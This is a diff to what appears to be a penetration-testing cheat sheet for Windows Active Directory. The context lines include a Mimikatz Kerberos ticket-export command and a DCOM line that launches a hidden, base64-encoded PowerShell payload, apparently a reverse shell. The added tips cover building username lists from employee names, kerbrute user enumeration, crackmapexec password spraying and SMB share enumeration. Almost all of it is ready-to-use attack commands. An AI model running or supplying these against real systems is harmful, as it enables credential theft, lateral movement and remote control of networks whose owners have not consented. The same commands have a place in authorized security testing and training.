@@ -396,3 +396,29 @@ sekurlsa::tickets /export
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
 AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ``` 
+
+## Tips
+### Generate Passwords from Public Usernames
+
+```bash
+#Sometimes a company website exposes full employee names. Example Lorem Ipsum
+#Instead of using only generic wordlists, generate custom users based on common username formats
+loremipsum
+lorem.ipsum
+lipsum
+l.ipsum
+lorem.i
+ipsuml
+ipsum.l
+
+kerbrute userenum -d domain.local --dc <IP> users.txt
+crackmapexec smb <IP> -u users.txt -p 'whatever'
+``` 
+### Always enumerate shares Twice
+```bash
+#Without credentials
+crackmapexec smb <IP> --shares -u '' -p ''
+
+#With credentials
+crackmapexec smb <IP> --shares -u user -p password
+``` 
